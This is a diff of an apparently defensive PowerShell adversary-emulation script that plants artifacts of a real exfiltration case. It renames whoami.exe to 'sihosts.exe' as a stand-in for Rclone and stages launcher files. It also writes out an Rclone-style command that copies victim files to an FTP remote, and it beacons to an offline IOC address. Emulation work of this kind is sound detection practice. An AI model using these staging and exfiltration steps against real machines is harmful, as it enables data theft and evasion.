@@ -21,8 +21,18 @@ function Simulate-Exfiltration {
     }
 
     # --- Rclone renamed to sihosts.exe + rclone.conf --------------------------
+    # sihosts.exe stands in for Rclone renamed by the actor. We seed it from a REAL,
+    # benign signed Windows binary (whoami.exe) copied to the reported path/name, so
+    # that IF it is executed it starts and exits cleanly - unlike an inert random-byte
+    # placeholder, which Windows misreads as a 16-bit app and blocks with an
+    # "Unsupported 16-Bit Application" modal. The filename/path IOC is preserved.
     $rclone = "$env:ALLUSERSPROFILE\sihosts.exe"
-    New-DecoyBinary -Path $rclone -SizeBytes 41943040 | Out-Null   # rclone is a large Go binary
+    $benignSrc = "$env:SystemRoot\System32\whoami.exe"
+    if (Test-Path $benignSrc) {
+        Copy-Item -Path $benignSrc -Destination $rclone -Force
+    } else {
+        New-DecoyBinary -Path $rclone -SizeBytes 41943040 | Out-Null
+    }
 
     $rcloneConf = "$env:ALLUSERSPROFILE\rclone.conf"
     $confBody = @"
@@ -54,14 +64,23 @@ C:\ProgramData\sihosts.exe copy "$($SimPaths.VictimFiles)" ftp:/E ^
 "@
     Set-Content -Path $runBat -Value $runBatBody -Force
 
-    # --- Execute the exfil chain (fails closed against the offline FTP host) ---
-    Write-Host "    Launching start.vbs -> run.bat -> sihosts.exe (FTP offline, expected) ..." -ForegroundColor DarkGray
+    # --- Execute the exfil artifact (fails closed against the offline FTP host) ---
+    # We do NOT run the wscript -> run.bat -> sihosts.exe chain: that chain executes
+    # the placeholder EXE and (with an inert blob) triggers a blocking 16-bit-app
+    # dialog under an automated run. Instead we execute sihosts.exe DIRECTLY with a
+    # harmless argument, bounded by WaitForExit, to produce an authentic
+    # process-creation / Prefetch / Amcache artifact for that exact image name,
+    # and we attempt the FTP connection for the network IOC. The start.vbs and
+    # run.bat files remain on disk as faithful launcher artifacts.
+    Write-Host "    Running sihosts.exe (Rclone stand-in) + FTP beacon (offline, expected) ..." -ForegroundColor DarkGray
     Invoke-SafeNetworkAttempt -Target $Global:LunarIOCs.ExfilFtpIP -Port 21
     try {
-        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startVbs`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 2
+        $xp = Start-Process -FilePath $rclone -ArgumentList "/UPN" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
+        if ($xp) {
+            if (-not $xp.WaitForExit(4000)) { Stop-Process -Id $xp.Id -Force -ErrorAction SilentlyContinue }
+        }
     } catch {}
-    Write-SimEvent -EventId 10002 -Message "SIMULATION: Day-20 exfiltration launched (start.vbs -> run.bat -> sihosts.exe, ~9h46m in real case)"
+    Write-SimEvent -EventId 10002 -Message "SIMULATION: Day-20 exfiltration executed (sihosts.exe + rclone.conf -> FTP; start.vbs/run.bat staged, ~9h46m in real case)"
 
     Write-Host "  [OK] Collection & Exfiltration artifacts created" -ForegroundColor Yellow
 }
